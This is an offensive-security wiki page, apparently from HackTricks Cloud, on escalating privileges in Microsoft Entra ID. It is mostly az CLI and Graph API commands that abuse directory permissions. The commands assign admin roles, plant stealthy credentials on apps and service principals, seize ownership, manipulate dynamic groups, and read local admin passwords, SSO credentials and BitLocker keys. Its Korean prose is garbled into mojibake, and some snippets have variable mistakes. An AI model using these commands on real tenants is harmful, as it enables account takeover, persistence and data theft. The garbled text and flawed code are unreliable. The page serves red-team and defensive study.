# Az - EntraID Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="info" %}
**Entra ID**ì— ë‚´ì¥ëœ ì—­í• ì˜ **ëª¨ë“  ì„¸ë¶€ ê¶Œí•œ**ì´ ì‚¬ìš©ì ì§€ì • ì—­í• ì— ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤.
{% endhint %}

## Roles

### Role: Privileged Role Administrator <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

ì´ ì—­í• ì€ ì£¼ì²´ì—ê²Œ ì—­í• ì„ í• ë‹¹í•˜ê³  ì—­í• ì— ë” ë§ì€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆëŠ” ë° í•„ìš”í•œ ì„¸ë¶€ ê¶Œí•œì„ í¬í•¨í•©ë‹ˆë‹¤. ë‘ ê°€ì§€ ì‘ì—… ëª¨ë‘ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ì‚¬ìš©ìì—ê²Œ ì—­í•  í• ë‹¹:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* ì—­í• ì— ë” ë§ì€ ê¶Œí•œ ì¶”ê°€:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Applications

### `microsoft.directory/applications/credentials/update`

ì´ê²ƒì€ ê³µê²©ìê°€ ê¸°ì¡´ ì• í”Œë¦¬ì¼€ì´ì…˜ì— **ìê²© ì¦ëª…**(ë¹„ë°€ë²ˆí˜¸ ë˜ëŠ” ì¸ì¦ì„œ)ì„ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì— íŠ¹ê¶Œ ê¶Œí•œì´ ìˆëŠ” ê²½ìš°, ê³µê²©ìëŠ” í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ìœ¼ë¡œ ì¸ì¦í•˜ê³  ê·¸ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

ì´ê²ƒì€ `applications/credentials/update`ì™€ ë™ì¼í•œ ì‘ì—…ì„ í—ˆìš©í•˜ì§€ë§Œ ë‹¨ì¼ ë””ë ‰í„°ë¦¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì— í•œì •ë©ë‹ˆë‹¤.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**ì„¤ëª…**: ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì†Œìœ ìë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤.\
**ë‚¨ìš© ê°€ëŠ¥ì„±**: ìì‹ ì„ ì†Œìœ ìë¡œ ì¶”ê°€í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” ìê²© ì¦ëª… ë° ê¶Œí•œì´ í¬í•¨ë©ë‹ˆë‹¤.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

ì´ê²ƒì€ ê³µê²©ìê°€ ê¸°ì¡´ ì„œë¹„ìŠ¤ ì£¼ì²´ì— ìê²© ì¦ëª…ì„ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì„œë¹„ìŠ¤ ì£¼ì²´ê°€ ìƒìŠ¹ëœ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ê·¸ ê¶Œí•œì„ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
ìƒˆë¡œ ìƒì„±ëœ ë¹„ë°€ë²ˆí˜¸ëŠ” ì›¹ ì½˜ì†”ì— ë‚˜íƒ€ë‚˜ì§€ ì•Šìœ¼ë¯€ë¡œ, ì´ëŠ” ì„œë¹„ìŠ¤ ì£¼ì²´ì— ëŒ€í•œ ì§€ì†ì„±ì„ ìœ ì§€í•˜ëŠ” ì€ë°€í•œ ë°©ë²•ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
APIë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

ë§Œì•½ `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."`ë¼ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´, **SPì˜ passwordCredentials ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**. ë¨¼ì € ì´ë¥¼ ì ê¸ˆ í•´ì œí•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œëŠ” ë‹¤ìŒì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ(`microsoft.directory/applications/allProperties/update`)ì´ í•„ìš”í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

ì´ ê¶Œí•œì€ ê³µê²©ìê°€ ê¸°ì¡´ ì„œë¹„ìŠ¤ ì£¼ì²´ì— ìê²© ì¦ëª…ì„ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤ ì£¼ì²´ê°€ ìƒìŠ¹ëœ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ê·¸ ê¶Œí•œì„ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

ì‘ìš© í”„ë¡œê·¸ë¨ê³¼ ìœ ì‚¬í•˜ê²Œ, ì„œë¹„ìŠ¤ ì£¼ì²´ë¥¼ ì†Œìœ í•˜ë©´ í•´ë‹¹ ìê²© ì¦ëª… ë° ê¶Œí•œì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
ìƒˆë¡œìš´ ì†Œìœ ìë¥¼ ì¶”ê°€í•œ í›„, ì´ë¥¼ ì œê±°í•˜ë ¤ê³  í–ˆì§€ë§Œ APIëŠ” DELETE ë©”ì„œë“œê°€ ì§€ì›ë˜ì§€ ì•ŠëŠ”ë‹¤ê³  ì‘ë‹µí–ˆìŠµë‹ˆë‹¤. ì†Œìœ ìë¥¼ ì‚­ì œí•˜ëŠ” ë° í•„ìš”í•œ ë©”ì„œë“œì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ë§ì´ì£ . ê·¸ë˜ì„œ **í˜„ì¬ ì†Œìœ ìë¥¼ ì œê±°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` ë° `enable`

ì´ ê¶Œí•œì€ ì„œë¹„ìŠ¤ ì£¼ì²´ë¥¼ ë¹„í™œì„±í™”í•˜ê³  í™œì„±í™”í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì„œë¹„ìŠ¤ ì£¼ì²´ë¥¼ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” í™œì„±í™”ëœ ì„œë¹„ìŠ¤ ì£¼ì²´ë¥¼ ì¥ì•…í•˜ê¸° ìœ„í•´ ë” ë§ì€ ê¶Œí•œì´ í•„ìš”í•˜ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

ì´ ê¶Œí•œì€ ë‹¨ì¼ ë¡œê·¸ì¸ì— ëŒ€í•œ ìê²© ì¦ëª…ì„ ìƒì„±í•˜ê³  ê°€ì ¸ì˜¬ ìˆ˜ ìˆê²Œ í•˜ì—¬ íƒ€ì‚¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## ê·¸ë£¹

### `microsoft.directory/groups/allProperties/update`

ì´ ê¶Œí•œì€ ì‚¬ìš©ìë¥¼ íŠ¹ê¶Œ ê·¸ë£¹ì— ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ì´ˆë˜í•©ë‹ˆë‹¤.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**ì°¸ê³ **: ì´ ê¶Œí•œì€ Entra ID ì—­í•  í• ë‹¹ ê·¸ë£¹ì„ ì œì™¸í•©ë‹ˆë‹¤.

### `microsoft.directory/groups/owners/update`

ì´ ê¶Œí•œì€ ê·¸ë£¹ì˜ ì†Œìœ ìê°€ ë  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ê·¸ë£¹ì˜ ì†Œìœ ìëŠ” ê·¸ë£¹ êµ¬ì„±ì› ë° ì„¤ì •ì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë©°, ì ì¬ì ìœ¼ë¡œ ê·¸ë£¹ì— ëŒ€í•œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**ì°¸ê³ **: ì´ ê¶Œí•œì€ Entra ID ì—­í•  í• ë‹¹ ê·¸ë£¹ì„ ì œì™¸í•©ë‹ˆë‹¤.

### `microsoft.directory/groups/members/update`

ì´ ê¶Œí•œì€ ê·¸ë£¹ì— êµ¬ì„±ì›ì„ ì¶”ê°€í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ê³µê²©ìëŠ” ìì‹ ì´ë‚˜ ì•…ì˜ì ì¸ ê³„ì •ì„ íŠ¹ê¶Œ ê·¸ë£¹ì— ì¶”ê°€í•˜ì—¬ ìƒìŠ¹ëœ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

ì´ ê¶Œí•œì€ ë™ì  ê·¸ë£¹ì—ì„œ ë©¤ë²„ì‹­ ê·œì¹™ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ê³µê²©ìëŠ” ë™ì  ê·œì¹™ì„ ìˆ˜ì •í•˜ì—¬ ëª…ì‹œì ì¸ ì¶”ê°€ ì—†ì´ ìì‹ ì„ ê¶Œí•œì´ ìˆëŠ” ê·¸ë£¹ì— í¬í•¨ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**ì°¸ê³ **: ì´ ê¶Œí•œì€ Entra ID ì—­í•  í• ë‹¹ ê·¸ë£¹ì„ ì œì™¸í•©ë‹ˆë‹¤.

### ë™ì  ê·¸ë£¹ í”„ë¼ì´ë²³ ì—ìŠ¤ì»¬ë ˆì´ì…˜

ì‚¬ìš©ìê°€ ìì‹ ì˜ ì†ì„±ì„ ìˆ˜ì •í•˜ì—¬ ë™ì  ê·¸ë£¹ì˜ êµ¬ì„±ì›ìœ¼ë¡œ ì¶”ê°€ë  ìˆ˜ ìˆëŠ” ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## ì‚¬ìš©ì

### `microsoft.directory/users/password/update`

ì´ ê¶Œí•œì€ ë¹„ê´€ë¦¬ì ì‚¬ìš©ìì—ê²Œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ì ì¬ì ì¸ ê³µê²©ìê°€ ë‹¤ë¥¸ ì‚¬ìš©ìì—ê²Œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

ì´ ê¶Œí•œì€ ì‚¬ìš©ìì˜ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì†ì„± ê°’ì— ë”°ë¼ ì‚¬ìš©ìë¥¼ ì¶”ê°€í•˜ëŠ” ë™ì  ê·¸ë£¹ì„ ì°¾ëŠ” ê²ƒì´ ì¼ë°˜ì ì´ë¯€ë¡œ, ì´ ê¶Œí•œì€ ì‚¬ìš©ìê°€ íŠ¹ì • ë™ì  ê·¸ë£¹ì˜ êµ¬ì„±ì›ì´ ë˜ê¸° ìœ„í•´ í•„ìš”í•œ ì†ì„± ê°’ì„ ì„¤ì •í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ê°€ëŠ¥í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## ì¡°ê±´ë¶€ ì•¡ì„¸ìŠ¤ ì •ì±… ë° MFA ìš°íšŒ

ì˜ëª» êµ¬ì„±ëœ MFAë¥¼ ìš”êµ¬í•˜ëŠ” ì¡°ê±´ë¶€ ì•¡ì„¸ìŠ¤ ì •ì±…ì€ ìš°íšŒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## ì¥ì¹˜

### `microsoft.directory/devices/registeredOwners/update`

ì´ ê¶Œí•œì€ ê³µê²©ìê°€ ì¥ì¹˜ì˜ ì†Œìœ ìë¡œ ìì‹ ì„ í• ë‹¹í•˜ì—¬ ì¥ì¹˜ íŠ¹ì • ì„¤ì • ë° ë°ì´í„°ì— ëŒ€í•œ ì œì–´ ë˜ëŠ” ì•¡ì„¸ìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

ì´ ê¶Œí•œì€ ê³µê²©ìê°€ ìì‹ ì˜ ê³„ì •ì„ ì¥ì¹˜ì™€ ì—°ê²°í•˜ì—¬ ì ‘ê·¼í•˜ê±°ë‚˜ ë³´ì•ˆ ì •ì±…ì„ ìš°íšŒí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

ì´ ê¶Œí•œì€ ê³µê²©ìê°€ Microsoft Entraì— ê°€ì…ëœ ì¥ì¹˜ì˜ ë°±ì—…ëœ ë¡œì»¬ ê´€ë¦¬ì ê³„ì • ìê²© ì¦ëª…ì˜ ì†ì„±ì„ ì½ì„ ìˆ˜ ìˆë„ë¡ í•˜ë©°, ì—¬ê¸°ì—ëŠ” ë¹„ë°€ë²ˆí˜¸ê°€ í¬í•¨ë©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

ì´ ê¶Œí•œì€ BitLocker í‚¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ì´ëŠ” ê³µê²©ìê°€ ë“œë¼ì´ë¸Œë¥¼ ë³µí˜¸í™”í•˜ì—¬ ë°ì´í„° ê¸°ë°€ì„±ì„ ì¹¨í•´í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## ê¸°íƒ€ í¥ë¯¸ë¡œìš´ ê¶Œí•œ (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
